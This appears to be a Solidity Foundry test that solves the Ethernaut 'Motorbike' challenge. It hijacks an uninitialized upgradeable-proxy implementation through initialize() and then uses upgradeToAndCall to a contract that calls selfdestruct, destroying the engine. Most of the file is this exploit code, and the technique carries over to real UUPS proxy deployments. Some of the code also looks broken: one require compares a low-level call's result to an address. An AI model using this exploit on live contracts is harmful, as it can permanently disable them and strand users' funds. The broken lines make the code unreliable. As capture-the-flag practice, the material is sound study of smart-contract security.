// SPDX-License-Identifier: MIT
pragma experimental ABIEncoderV2;
pragma solidity 0.6.12;

import "forge-std/Test.sol";
import "../src/Motorbike.sol";

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

    function _contextSuffixLength() internal view virtual returns (uint256) {
        return 0;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    function owner() public view virtual returns (address);

    function _checkOwner() internal view virtual;

    function renounceOwnership() public virtual;

    function transferOwnership(address newOwner) public virtual;

    function _transferOwnership(address newOwner) internal virtual;
}

abstract contract Level is Ownable {
    function createInstance(
        address _player
    ) public payable virtual returns (address);
    function validateInstance(
        address payable _instance,
        address _player
    ) public virtual returns (bool);
}

abstract contract MotorbikeFactory is Level {
    mapping(address => address) private engines;

    function createInstance(
        address _player
    ) public payable virtual override returns (address);

    function validateInstance(
        address payable _instance,
        address _player
    ) public virtual override returns (bool);
}

contract MiddleMan {
    function attack() public payable {
        selfdestruct(payable(address(0)));
    }
}

contract Execution {
    address ethernaut;

    constructor(address _ethernaut) public {
        ethernaut = _ethernaut;
    }

    function hack(address level, address engine) public {
        ethernaut.call(
            abi.encodeWithSignature("createLevelInstance(address)", level)
        );

        engine.call(abi.encodeWithSignature("initialize()"));

        MiddleMan middleMan = new MiddleMan();
        engine.call(
            abi.encodeWithSignature(
                "upgradeToAndCall(address,bytes)",
                address(middleMan),
                abi.encodeWithSignature("attack()")
            )
        );
    }

    // note that using this approach, we can verify the result while with MotorbikeFactory
    // while Ethernaut requires submitter to register as a player,
    // so unless this contract is registered as a player, this function call will fail
    function submit(address payable instance) public {
        ethernaut.call(
            abi.encodeWithSignature("submitLevelInstance(address)", instance)
        );
    }
}

contract ExecutionTest is Test {
    function hack(address factoryAddress) public returns (address) {
        MotorbikeFactory motorbikeFactory = MotorbikeFactory(factoryAddress);
        address motorbikeAddress = motorbikeFactory.createInstance(msg.sender);
        console.logAddress(motorbikeAddress);

        address engine = address(
            uint160(
                uint256(
                    vm.load(
                        motorbikeAddress,
                        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
                    )
                )
            )
        );
        console.logAddress(engine);

        engine.call(abi.encodeWithSignature("initialize()"));
        require(
            engine.call(abi.encodeWithSignature("upgrader()")) == address(this),
            "upgrader is not this"
        );

        MiddleMan middleMan = new MiddleMan();
        engine.call(
            abi.encodeWithSignature(
                "upgradeToAndCall(address,bytes)",
                address(middleMan),
                abi.encodeWithSignature("attack()")
            )
        );

        console.logBool(
            motorbikeFactory.validateInstance(
                payable(motorbikeAddress),
                msg.sender
            )
        );

        return engine;
    }
}

contract MotorbikeTest is Test {
    MotorbikeFactory motorbikeFactory =
        MotorbikeFactory(vm.envAddress("MOTORBIKE_FACTORY"));

    function test() public {
        ExecutionTest execution = new ExecutionTest();
        uint64 nonce = vm.getNonce(address(motorbikeFactory));
        console.logUint(nonce);
        console.logBytes(abi.encodeWithSelector(MiddleMan.attack.selector));

        address engineAddress = execution.hack(address(motorbikeFactory));
        console.logBool(isContract(engineAddress));
    }

    function isContract(address _addr) internal view returns (bool) {
        uint256 size;

        assembly {
            size := extcodesize(_addr)
        }
        return size > 0;
    }
}
